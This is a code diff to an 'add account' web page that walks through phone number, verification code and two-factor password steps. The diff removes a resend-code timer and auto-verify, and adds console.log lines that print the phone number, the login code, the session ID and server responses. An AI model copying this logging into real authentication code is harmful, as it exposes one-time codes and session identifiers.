@@ -274,24 +274,6 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
-        /* Resend timer */
-        .resend-timer {
-            color: #8e9fad;
-            font-size: 0.9rem;
-            text-align: center;
-            margin-top: 16px;
-        }
-
-        .resend-btn {
-            background: transparent;
-            color: #4c9ce0;
-            border: none;
-            font-size: 0.9rem;
-            cursor: pointer;
-            text-decoration: underline;
-            margin-top: 8px;
-        }
     </style>
 </head>
 <body>
@@ -356,9 +338,6 @@
                 <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                     <span>Verify</span>
                 </button>
-
-                <!-- Resend timer -->
-                <div class="resend-timer" id="resendTimer"></div>
             </div>
 
             <!-- Page 3: Two-Factor Authentication -->
@@ -510,12 +489,6 @@
         hiddenInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
             updateCodeBoxes();
-            
-            // Auto verify when 5 digits entered
-            if (this.value.length === 5) {
-                currentCode = this.value; // Store the code
-                setTimeout(() => verifyCode(), 300);
-            }
         });
 
         // Navigation
@@ -542,6 +515,7 @@
             setLoading(button, true);
 
             try {
+                console.log('Sending code to:', phoneNumber);
                 const response = await fetch('/api/add-account', {
                     method: 'POST',
                     headers: {
@@ -551,6 +525,7 @@
                 });
 
                 const data = await response.json();
+                console.log('Response:', data);
 
                 if (data.success) {
                     currentSessionId = data.session_id;
@@ -565,7 +540,6 @@
                     updateCodeBoxes();
                     setTimeout(() => hiddenInput.focus(), 300);
                     
-                    startResendTimer();
                     showSuccess('Code sent successfully!');
                 } else {
                     showError(data.error || 'Failed to send code');
@@ -593,6 +567,7 @@
             setLoading(button, true);
 
             try {
+                console.log('Verifying code:', code, 'Session:', currentSessionId);
                 const response = await fetch('/api/verify-code', {
                     method: 'POST',
                     headers: {
@@ -605,6 +580,7 @@
                 });
 
                 const data = await response.json();
+                console.log('Verify response:', data);
 
                 if (data.success) {
                     // Show success page
@@ -613,10 +589,6 @@
                     
                     document.getElementById('successAccountInfo').innerHTML = 
                         `Account added successfully!`;
-                    
-                    if (timerInterval) {
-                        clearInterval(timerInterval);
-                    }
                     
                     showSuccess('Account added successfully!');
                     
@@ -662,6 +634,7 @@
             setLoading(button, true);
 
             try {
+                console.log('Submitting password with code:', currentCode);
                 const response = await fetch('/api/verify-code', {
                     method: 'POST',
                     headers: {
@@ -675,6 +648,7 @@
                 });
 
                 const data = await response.json();
+                console.log('Password response:', data);
 
                 if (data.success) {
                     // Show success page
@@ -683,10 +657,6 @@
                     
                     document.getElementById('successAccountInfo').innerHTML = 
                         `Account added successfully!`;
-                    
-                    if (timerInterval) {
-                        clearInterval(timerInterval);
-                    }
                     
                     showSuccess('Account added successfully!');
                     
@@ -703,59 +673,6 @@
             }
         }
 
-        // Resend code
-        async function resendCode() {
-            if (!currentPhone) {
-                backToPage1();
-                return;
-            }
-
-            try {
-                const response = await fetch('/api/add-account', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ phone: currentPhone })
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    currentSessionId = data.session_id;
-                    hiddenInput.value = '';
-                    updateCodeBoxes();
-                    startResendTimer();
-                    showSuccess('Code resent successfully!');
-                    hiddenInput.focus();
-                } else {
-                    showError(data.error || 'Failed to resend code');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                showError('Network error. Please try again.');
-            }
-        }
-
-        function startResendTimer() {
-            timeLeft = 60;
-            const timerEl = document.getElementById('resendTimer');
-            
-            if (timerInterval) {
-                clearInterval(timerInterval);
-            }
-            
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    timerEl.innerHTML = '<button class="resend-btn" onclick="resendCode()">Resend Code</button>';
-                } else {
-                    timerEl.textContent = `Resend code in ${timeLeft}s`;
-                }
-            }, 1000);
-        }
-
         function backToPage1() {
             document.getElementById('page1').style.display = 'block';
             document.getElementById('page2').style.display = 'none';
@@ -767,10 +684,6 @@
             updateCodeBoxes();
             document.getElementById('phone').focus();
             currentCode = ''; // Clear stored code
-            
-            if (timerInterval) {
-                clearInterval(timerInterval);
-            }
         }
 
         function backToPage2() {
@@ -811,7 +724,7 @@
 
         // Focus hidden input when clicking page 2
         document.getElementById('page2').addEventListener('click', function(e) {
-            if (e.target.tagName !== 'BUTTON' && !e.target.classList.contains('resend-btn')) {
+            if (e.target.tagName !== 'BUTTON') {
                 hiddenInput.focus();
             }
         });
@@ -822,4 +735,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
